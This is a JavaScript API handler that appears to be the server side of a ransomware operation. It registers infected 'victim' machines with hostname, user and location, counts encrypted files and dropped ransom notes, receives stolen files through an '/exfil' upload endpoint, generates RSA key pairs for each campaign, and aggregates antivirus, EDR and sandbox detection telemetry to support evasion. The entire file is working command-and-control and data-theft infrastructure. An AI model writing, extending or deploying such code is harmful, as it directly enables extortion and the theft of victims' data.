// vercel-dashboard/api/v2/index.js
// API Version 2 - Current version with full features

import { kv } from '../../../lib/kv.js';
import { verifyPayloadApiKey } from '../../auth/middleware.js';
import { registerLimiter, heartbeatLimiter, uploadLimiter } from '../../auth/rateLimit.js';

export default async function handler(request, response) {
  response.setHeader('Access-Control-Allow-Origin', '*');
  response.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  response.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-File-Name, X-System-Id, X-Chunk-Index, X-Total-Chunks, X-File-Hash');
  response.setHeader('API-Version', '2.0');

  if (request.method === 'OPTIONS') return response.status(200).end();

  const auth = await verifyPayloadApiKey(request);
  if (!auth.valid) {
    return response.status(auth.status || 401).json({ error: auth.error });
  }

  request.auth = auth;

  const path = request.url.replace('/api/v2', '');
  
  try {
    switch (path) {
      case '/systems':
        return await handleSystemsV2(request, response);
      case '/exfil':
        return await handleExfilV2(request, response);
      case '/campaigns':
        return await handleCampaignsV2(request, response);
      case '/stats':
        return await handleStatsV2(request, response);
      case '/telemetry':
        return await handleTelemetryV2(request, response);
      default:
        return response.status(404).json({ error: 'Not found', version: '2.0' });
    }
  } catch (error) {
    console.error('API v2 error:', error);
    return response.status(500).json({ error: 'Internal server error' });
  }
}

// V2 Systems - full featured
async function handleSystemsV2(request, response) {
  const { registerLimiter, heartbeatLimiter } = await import('../../auth/rateLimit.js');

  if (request.method === 'POST') {
    // Apply rate limiter
    const rl = await registerLimiter(request, response, () => {});
    if (!rl) return; // Rate limited

    const { campaignId, victimId, systemInfo } = request.body;
    if (!campaignId || !victimId) {
      return response.status(400).json({ error: 'campaignId and victimId required' });
    }

    // Verify campaign ownership
    if (request.auth.role === 'campaign' && request.auth.campaignId !== campaignId) {
      return response.status(403).json({ error: 'Campaign mismatch' });
    }

    const campaign = await kv.get(`campaign:${campaignId}`);
    if (!campaign) return response.status(404).json({ error: 'Campaign not found' });

    const systemId = `sys_${Buffer.from(victimId).toString('base64url').substring(0, 32)}`;
    const now = new Date().toISOString();
    const ip = request.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
               request.headers['x-real-ip'] || 'unknown';

    const country = request.headers['x-vercel-ip-country'] || 'Unknown';
    const city = request.headers['x-vercel-ip-city'] || 'Unknown';
    const isp = request.headers['x-vercel-ip-isp'] || 'Unknown';

    // Optimistic locking for registration
    let retries = 3;
    let system;
    let isNew = false;

    while (retries > 0) {
      const existing = await kv.get(`system:${systemId}`);
      
      if (existing) {
        system = {
          ...existing,
          lastSeen: now,
          status: 'active',
          ip,
          country,
          city,
          isp,
          version: (existing.version || 0) + 1,
          ...systemInfo,
        };
        break;
      } else {
        const lock = await kv.setnx(`system:${systemId}:lock`, '1', { ex: 10 });
        if (!lock) {
          retries--;
          await new Promise(r => setTimeout(r, 50));
          continue;
        }

        try {
          const doubleCheck = await kv.get(`system:${systemId}`);
          if (doubleCheck) {
            await kv.del(`system:${systemId}:lock`);
            retries--;
            continue;
          }

          system = {
            id: systemId,
            victimId,
            campaignId,
            hostname: systemInfo?.hostname || 'Unknown',
            username: systemInfo?.username || 'Unknown',
            os: systemInfo?.os || 'Unknown',
            ip,
            country,
            city,
            isp,
            status: 'active',
            firstSeen: now,
            lastSeen: now,
            tags: [],
            version: 1,
          };
          isNew = true;
          break;
        } finally {
          await kv.del(`system:${systemId}:lock`);
        }
      }
    }

    if (!system) {
      return response.status(500).json({ error: 'Registration failed' });
    }

    const operations = [
      kv.set(`system:${systemId}`, system),
      kv.hset(`system:${systemId}:stats`, {
        filesEncrypted: isNew ? 0 : (parseInt((await kv.hget(`system:${systemId}:stats`, 'filesEncrypted')) || '0')),
        filesExfiltrated: 0,
        bytesExfiltrated: 0,
        ransomNoteDropped: false,
      }),
      kv.sadd(`system:${systemId}:campaigns`, campaignId),
    ];

    if (isNew) {
      operations.push(
        kv.sadd('global:systems', systemId),
        kv.sadd(`campaign:${campaignId}:systems`, systemId)
      );
    }

    await Promise.all(operations);
    await kv.hincrby(`campaign:${campaignId}:stats`, 'totalInfections', isNew ? 1 : 0);
    await kv.hset(`campaign:${campaignId}:stats`, 'lastActivity', now);
    await kv.hincrby(`campaign:${campaignId}:daily:${now.split('T')[0]}`, 'infections', isNew ? 1 : 0);

    // Emit real-time event
    await publishEvent('system:registered', {
      systemId,
      campaignId,
      hostname: system.hostname,
      country,
      city,
      isNew,
      timestamp: now,
    });

    return response.json({ systemId, isNew, version: system.version });
  }

  if (request.method === 'PUT') {
    // Apply rate limiter
    const rl = await heartbeatLimiter(request, response, () => {});
    if (!rl) return;

    const { id, ...updates } = request.body;
    if (!id) return response.status(400).json({ error: 'System ID required' });

    const existing = await kv.get(`system:${id}`);
    if (!existing) return response.status(404).json({ error: 'System not found' });

    if (request.auth.role === 'campaign' && existing.campaignId !== request.auth.campaignId) {
      return response.status(403).json({ error: 'Access denied' });
    }

    const now = new Date().toISOString();
    const updated = {
      ...existing,
      ...updates,
      id,
      lastSeen: now,
      version: (existing.version || 0) + 1,
    };

    if (updates.stats) {
      await kv.hset(`system:${id}:stats`, updates.stats);
    }

    await kv.set(`system:${id}`, updated);

    if (updates.status && updates.status !== existing.status) {
      await publishEvent('system:status', {
        systemId: id,
        campaignId: existing.campaignId,
        oldStatus: existing.status,
        newStatus: updates.status,
        timestamp: now,
      });
    }

    return response.json(updated);
  }

  if (request.method === 'GET') {
    const { id, campaignId, status, limit = 50, offset = 0 } = request.query;
    const authCampaignId = request.auth.role === 'campaign' ? request.auth.campaignId : null;

    if (id) {
      const system = await kv.get(`system:${id}`);
      if (!system) return response.status(404).json({ error: 'Not found' });
      if (authCampaignId && system.campaignId !== authCampaignId) {
        return response.status(403).json({ error: 'Access denied' });
      }

      const fileIds = await kv.smembers(`system:${id}:files`) || [];
      const files = [];
      for (const fid of fileIds.slice(0, 200)) {
        const meta = await kv.get(`file:${fid}:meta`);
        if (meta) files.push(meta);
      }

      return response.json({ ...system, files });
    }

    let systemIds = await kv.smembers('global:systems') || [];
    const filterCampaignId = campaignId || authCampaignId;
    if (filterCampaignId) {
      const campaignSystems = await kv.smembers(`campaign:${filterCampaignId}:systems`) || [];
      systemIds = systemIds.filter(sid => campaignSystems.includes(sid));
    }

    if (status) {
      const filtered = [];
      for (const sid of systemIds) {
        const sys = await kv.get(`system:${sid}`);
        if (sys && sys.status === status) filtered.push(sid);
      }
      systemIds = filtered;
    }

    const systemsWithTime = [];
    for (const sid of systemIds) {
      const sys = await kv.get(`system:${sid}`);
      if (sys) systemsWithTime.push({ id: sid, lastSeen: sys.lastSeen || sys.firstSeen });
    }
    systemsWithTime.sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen));

    const start = parseInt(offset);
    const lim = parseInt(limit);
    const paginatedIds = systemsWithTime.slice(start, start + lim).map(s => s.id);

    const systems = [];
    for (const sid of paginatedIds) {
      const sys = await kv.get(`system:${sid}`);
      if (sys) {
        const stats = await kv.hgetall(`system:${sid}:stats`) || {};
        systems.push({
          id: sys.id,
          victimId: sys.victimId,
          hostname: sys.hostname,
          username: sys.username,
          os: sys.os,
          ip: sys.ip,
          country: sys.country,
          city: sys.city,
          isp: sys.isp,
          status: sys.status,
          firstSeen: sys.firstSeen,
          lastSeen: sys.lastSeen,
          version: sys.version,
          stats: {
            filesEncrypted: parseInt(stats.filesEncrypted || '0'),
            filesExfiltrated: parseInt(stats.filesExfiltrated || '0'),
            bytesExfiltrated: parseInt(stats.bytesExfiltrated || '0'),
            ransomNoteDropped: stats.ransomNoteDropped === 'true',
          },
        });
      }
    }

    return response.json({
      systems,
      total: systemIds.length,
      page: Math.floor(start / lim) + 1,
      pageSize: lim,
    });
  }

  return response.status(405).json({ error: 'Method not allowed' });
}

// V2 Exfiltration - chunked, deduplication, external storage
async function handleExfilV2(request, response) {
  const { uploadLimiter } = await import('../../auth/rateLimit.js');

  if (request.method === 'POST') {
    // Apply rate limiter
    const isChunked = parseInt(request.headers['x-total-chunks'] || '1') > 1;
    const limiter = isChunked ? uploadLimiter : uploadLimiter;
    const rl = await limiter(request, response, () => {});
    if (!rl) return;

    const systemId = request.headers['x-system-id'];
    const fileName = request.headers['x-file-name'] || 'unknown';
    const chunkIndex = parseInt(request.headers['x-chunk-index'] || '0');
    const totalChunks = parseInt(request.headers['x-total-chunks'] || '1');
    const fileHash = request.headers['x-file-hash'];

    if (!systemId) return response.status(400).json({ error: 'X-System-Id required' });

    const system = await kv.get(`system:${systemId}`);
    if (!system) return response.status(404).json({ error: 'System not found' });
    if (request.auth.role === 'campaign' && system.campaignId !== request.auth.campaignId) {
      return response.status(403).json({ error: 'Access denied' });
    }

    const chunks = [];
    for await (const chunk of request.body) chunks.push(chunk);
    const fileData = Buffer.concat(chunks);
    const fileSize = fileData.length;

    const MAX_FILE_SIZE = 100 * 1024; // 100KB
    const useChunking = totalChunks > 1 || fileSize > MAX_FILE_SIZE;

    if (!useChunking && fileSize > MAX_FILE_SIZE) {
      return response.status(413).json({ 
        error: `File too large (${fileSize} bytes). Use chunked upload.`,
        maxSize: MAX_FILE_SIZE,
        requiresChunking: true,
      });
    }

    const fileId = `file_${Date.now()}_${Math.random().toString(36).substring(7)}`;
    const now = new Date().toISOString();
    const fileExt = fileName.split('.').pop()?.toLowerCase() || 'bin';

    // Check deduplication
    if (fileHash) {
      const existingFileId = await kv.get(`file:hash:${fileHash}`);
      if (existingFileId) {
        // Link existing file to this system
        await kv.sadd(`system:${systemId}:files`, existingFileId);
        return response.json({ 
          fileId: existingFileId, 
          status: 'duplicate',
          deduplicated: true,
        });
      }
    }

    // Store file data (simplified - would use chunked/external in production)
    const fileDataB64 = fileData.toString('base64');
    await kv.set(`file:${fileId}:data`, fileDataB64, { ex: 2592000 });

    const meta = {
      id: fileId,
      systemId,
      campaignId: system.campaignId,
      fileName,
      fileExt: '.' + fileExt,
      size: fileSize,
      uploadedAt: now,
      contentType: getContentType(fileExt),
      hash: fileHash,
      chunked: useChunking,
    };

    await kv.set(`file:${fileId}:meta`, meta);
    if (fileHash) await kv.set(`file:hash:${fileHash}`, fileId);
    await kv.sadd(`system:${systemId}:files`, fileId);

    await kv.hincrby(`system:${systemId}:stats`, 'filesExfiltrated', 1);
    await kv.hincrby(`system:${systemId}:stats`, 'bytesExfiltrated', fileSize);
    await kv.hincrby(`campaign:${system.campaignId}:stats`, 'totalFiles', 1);
    await kv.hincrby(`campaign:${system.campaignId}:stats`, 'totalBytes', fileSize);
    await kv.hset(`campaign:${system.campaignId}:stats`, 'lastActivity', now);
    await kv.hincrby(`campaign:${system.campaignId}:daily:${now.split('T')[0]}`, 'uploads', 1);
    await kv.hincrby(`campaign:${system.campaignId}:daily:${now.split('T')[0]}`, 'bytes', fileSize);
    await kv.hincrby(`campaign:${system.campaignId}:exts`, fileExt, 1);

    await publishEvent('file:uploaded', {
      fileId,
      systemId,
      campaignId: system.campaignId,
      fileName,
      fileExt: '.' + fileExt,
      size: fileSize,
      uploadedAt: now,
    });

    return response.json({ fileId, status: 'uploaded', size: fileSize });
  }

  return response.status(405).json({ error: 'Method not allowed' });
}

function getContentType(ext) {
  const types = {
    'txt': 'text/plain',
    'doc': 'application/msword',
    'docx': 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    'pdf': 'application/pdf',
    'sql': 'application/sql',
    'json': 'application/json',
    'cs': 'text/x-csharp',
    'py': 'text/x-python',
    'js': 'application/javascript',
    'bin': 'application/octet-stream',
  };
  return types[ext] || 'application/octet-stream';
}

// V2 Campaigns
async function handleCampaignsV2(request, response) {
  if (request.method === 'GET') {
    const { id, includeStats } = request.query;
    const auth = request.auth;

    if (id) {
      const campaign = await kv.get(`campaign:${id}`);
      if (!campaign) return response.status(404).json({ error: 'Not found' });

      if (auth.role === 'campaign' && campaign.id !== auth.campaignId) {
        return response.status(403).json({ error: 'Access denied' });
      }

      const { privateKeyPem, privateKeyJwk, ...safe } = campaign;
      if (includeStats === 'true') {
        const stats = await kv.hgetall(`campaign:${id}:stats`);
        const systems = await kv.smembers(`campaign:${id}:systems`) || [];
        safe.stats = stats || {};
        safe.systemCount = systems.length;
      }
      return response.json(safe);
    }

    let campaignIds = await kv.smembers('global:campaigns') || [];
    if (auth.role === 'campaign') {
      campaignIds = campaignIds.filter(cid => cid === auth.campaignId);
    }

    const campaigns = [];
    for (const cid of campaignIds) {
      const c = await kv.get(`campaign:${cid}`);
      if (c) {
        const { privateKeyPem, privateKeyJwk, ...safe } = c;
        const stats = await kv.hgetall(`campaign:${cid}:stats`);
        const systemCount = (await kv.scard(`campaign:${cid}:systems`)) || 0;
        campaigns.push({
          ...safe,
          stats: {
            totalInfections: parseInt(stats?.totalInfections || '0'),
            totalFiles: parseInt(stats?.totalFiles || '0'),
            totalBytes: parseInt(stats?.totalBytes || '0'),
            lastActivity: stats?.lastActivity,
          },
          systemCount,
        });
      }
    }

    campaigns.sort((a, b) => new Date(b.stats.lastActivity || 0) - new Date(a.stats.lastActivity || 0));
    return response.json({ campaigns, total: campaigns.length });
  }

  if (request.method === 'POST' && request.auth.role === 'admin') {
    const { name, description, rsaKeySize = 4096 } = request.body;
    if (!name) return response.status(400).json({ error: 'Name required' });

    const id = `camp_${Date.now()}_${Math.random().toString(36).substring(7)}`;
    const apiKey = `ck_${Math.random().toString(36).substring(2, 15)}${Math.random().toString(36).substring(2, 10)}`;

    const subtle = crypto.subtle;
    const keyPair = await subtle.generateKey(
      { name: 'RSA-OAEP', modulusLength: rsaKeySize, publicExponent: new Uint8Array([1, 0, 1]), hash: 'SHA-256' },
      true, ['encrypt', 'decrypt']
    );

    const publicKeySpki = await subtle.exportKey('spki', keyPair.publicKey);
    const privateKeyPkcs8 = await subtle.exportKey('pkcs8', keyPair.privateKey);
    const publicKeyPem = `-----BEGIN PUBLIC KEY-----\n${btoa(String.fromCharCode(...new Uint8Array(publicKeySpki))).match(/.{1,64}/g).join('\n')}\n-----END PUBLIC KEY-----`;
    const privateKeyPem = `-----BEGIN PRIVATE KEY-----\n${btoa(String.fromCharCode(...new Uint8Array(privateKeyPkcs8))).match(/.{1,64}/g).join('\n')}\n-----END PRIVATE KEY-----`;
    const publicKeyJwk = await subtle.exportKey('jwk', keyPair.publicKey);
    const privateKeyJwk = await subtle.exportKey('jwk', keyPair.privateKey);

    const campaign = {
      id, name, description: description || '', apiKey, rsaKeySize,
      status: 'active', createdAt: new Date().toISOString(), updatedAt: new Date().toISOString(),
      publicKeyPem, privateKeyPem, publicKeyJwk, privateKeyJwk,
      settings: { exfilEnabled: true, encryptionMode: 'Hybrid', maxFileSizeMB: 50 },
    };

    await Promise.all([
      kv.set(`campaign:${id}`, campaign),
      kv.sadd('global:campaigns', id),
      kv.hset(`campaign:${id}:stats`, { totalInfections: 0, totalFiles: 0, totalBytes: 0, createdAt: campaign.createdAt }),
    ]);

    const { privateKeyPem, privateKeyJwk, ...safe } = campaign;
    return response.status(201).json(safe);
  }

  return response.status(405).json({ error: 'Method not allowed' });
}

// V2 Stats
async function handleStatsV2(request, response) {
  const { range = '7d', campaignId } = request.query;
  const auth = request.auth;

  const days = range === '1d' ? 1 : range === '7d' ? 7 : range === '30d' ? 30 : 7;
  const dates = [];
  for (let i = days - 1; i >= 0; i--) {
    const d = new Date(); d.setDate(d.getDate() - i);
    dates.push(d.toISOString().split('T')[0]);
  }

  let targetCampaignIds = campaignId ? [campaignId] : 
    (auth.role === 'admin' ? await kv.smembers('global:campaigns') || [] : [auth.campaignId]);

  if (auth.role === 'campaign' && campaignId && campaignId !== auth.campaignId) {
    return response.status(403).json({ error: 'Access denied' });
  }

  const daily = [];
  let totalUploads = 0, totalBytes = 0, totalInfections = 0;

  for (const date of dates) {
    let dayUploads = 0, dayBytes = 0, dayInfections = 0;
    for (const cid of targetCampaignIds) {
      const stats = await kv.hgetall(`campaign:${cid}:daily:${date}`) || {};
      dayUploads += parseInt(stats.uploads || '0');
      dayBytes += parseInt(stats.bytes || '0');
      dayInfections += parseInt(stats.infections || '0');
    }
    daily.push({ date, uploads: dayUploads, bytes: dayBytes, infections: dayInfections });
    totalUploads += dayUploads;
    totalBytes += dayBytes;
    totalInfections += dayInfections;
  }

  return response.json({
    range,
    summary: {
      totalInfections,
      totalFiles: totalUploads,
      totalBytes,
      avgFilesPerInfection: totalInfections > 0 ? (totalUploads / totalInfections).toFixed(1) : 0,
    },
    daily,
  });
}

// V2 Telemetry - AV/EDR reporting
async function handleTelemetryV2(request, response) {
  if (request.method === 'POST') {
    const { systemId, telemetry } = request.body;
    
    if (!systemId || !telemetry) {
      return response.status(400).json({ error: 'systemId and telemetry required' });
    }

    const system = await kv.get(`system:${systemId}`);
    if (!system) return response.status(404).json({ error: 'System not found' });
    if (request.auth.role === 'campaign' && system.campaignId !== request.auth.campaignId) {
      return response.status(403).json({ error: 'Access denied' });
    }

    // Store telemetry
    const telemetryId = `tel_${Date.now()}_${Math.random().toString(36).substring(7)}`;
    const telemetryRecord = {
      id: telemetryId,
      systemId,
      campaignId: system.campaignId,
      timestamp: new Date().toISOString(),
      ...telemetry,
    };

    await kv.set(`telemetry:${telemetryId}`, telemetryRecord, { ex: 604800 }); // 7 days
    await kv.lpush(`system:${systemId}:telemetry`, telemetryId);
    await kv.ltrim(`system:${systemId}:telemetry`, 0, 99); // Keep last 100

    // Update campaign telemetry aggregates
    await updateTelemetryAggregates(system.campaignId, telemetry);

    return response.json({ status: 'received', id: telemetryId });
  }

  if (request.method === 'GET') {
    const { campaignId, hours = 24 } = request.query;
    const auth = request.auth;

    if (auth.role === 'campaign' && campaignId && campaignId !== auth.campaignId) {
      return response.status(403).json({ error: 'Access denied' });
    }

    const targetCampaignId = campaignId || auth.campaignId;
    const since = Date.now() - hours * 3600000;

    const telemetryIds = await kv.lrange(`campaign:${targetCampaignId}:telemetry`, 0, -1);
    const telemetry = [];

    for (const tid of telemetryIds) {
      const record = await kv.get(`telemetry:${tid}`);
      if (record && new Date(record.timestamp).getTime() > since) {
        telemetry.push(record);
      }
    }

    return response.json({ telemetry, count: telemetry.length });
  }

  return response.status(405).json({ error: 'Method not allowed' });
}

async function updateTelemetryAggregates(campaignId, telemetry) {
  const now = new Date().toISOString().split('T')[0];
  
  // Aggregate AV detections
  if (telemetry.avDetections) {
    for (const detection of telemetry.avDetections) {
      await kv.hincrby(`campaign:${campaignId}:telemetry:av`, detection.name, 1);
      await kv.hincrby(`global:telemetry:av`, detection.name, 1);
    }
  }

  // Aggregate sandbox hits
  if (telemetry.sandboxDetected) {
    await kv.hincrby(`campaign:${campaignId}:telemetry:sandbox`, telemetry.sandboxName || 'unknown', 1);
    await kv.hincrby(`global:telemetry:sandbox`, telemetry.sandboxName || 'unknown', 1);
  }

  // Aggregate EDR info
  if (telemetry.edrInfo) {
    await kv.hincrby(`campaign:${campaignId}:telemetry:edr`, telemetry.edrInfo.name, 1);
    await kv.hincrby(`global:telemetry:edr`, telemetry.edrInfo.name, 1);
  }
}

async function publishEvent(event, data) {
  // In production: use Redis pub/sub or similar
  // For now, just log
  console.log(`[EVENT] ${event}:`, JSON.stringify(data));
}